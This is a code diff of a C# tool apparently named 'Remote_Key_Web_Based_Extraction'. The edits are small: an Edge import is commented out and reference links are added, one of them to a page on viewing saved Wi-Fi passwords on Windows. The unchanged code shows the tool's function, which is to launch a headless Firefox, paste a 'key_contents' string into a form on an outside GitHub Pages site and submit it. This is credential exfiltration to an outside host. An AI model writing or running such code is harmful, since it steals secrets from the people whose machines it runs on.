@@ -3,11 +3,13 @@ using System.Diagnostics;
 using System.Collections.Generic;
 using System.Management.Automation;
 using OpenQA.Selenium;
-using OpenQA.Selenium.Edge;
+// using OpenQA.Selenium.Edge;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Firefox;
 
 // https://github.com/PowerShell/PowerShell/issues/7909
+// https://stackoverflow.com/questions/33657532/how-to-view-saved-wifi-passwords-on-windows-7-8-10
+// https://itnext.io/app-trimming-in-net-5-reduce-your-app-sizes-dramatically-39891e2bedc1
 // 107 MB
 // dotnet publish -o .\publish -r win10-x64 -p:PublishSingleFile=true --self-contained true
 // Reduced down to: 78 MB
@@ -72,15 +74,14 @@ namespace Remote_Key_Web_Based_Extraction
         public void web_content_key_extraction(string key_contents)
         {
             /*
-            
             EdgeOptions edgeOptions = new EdgeOptions();
             var current_drver = new EdgeDriver();
             OpenQA.Selenium.IWebDriver current_drver = new Microsoft.EdgeDriver();
             var options = new EdgeOptions();
             options.UseInPrivateBrowsing = true;
             var current_driver = new EdgeDriver(options);
-             
             */
+
             try
             {
                 Console.WriteLine("[=] Attempting to run Chrome Driver");
@@ -100,7 +101,7 @@ namespace Remote_Key_Web_Based_Extraction
                 FirefoxOptions fireFoxOptions = new FirefoxOptions();
                 fireFoxOptions.AddArgument("--headless");
                 OpenQA.Selenium.IWebDriver current_drver = new FirefoxDriver(fireFoxOptions);
-                current_drver.Navigate().GoToUrl("https://anthony-t-n.github.io/");
+                current_drver.Navigate().GoToUrl(@"https://anthony-t-n.github.io/");
                 current_drver.FindElement(OpenQA.Selenium.By.Name("message")).SendKeys(key_contents);
                 current_drver.FindElement(OpenQA.Selenium.By.Name("send")).Click();
                 current_drver.Quit();
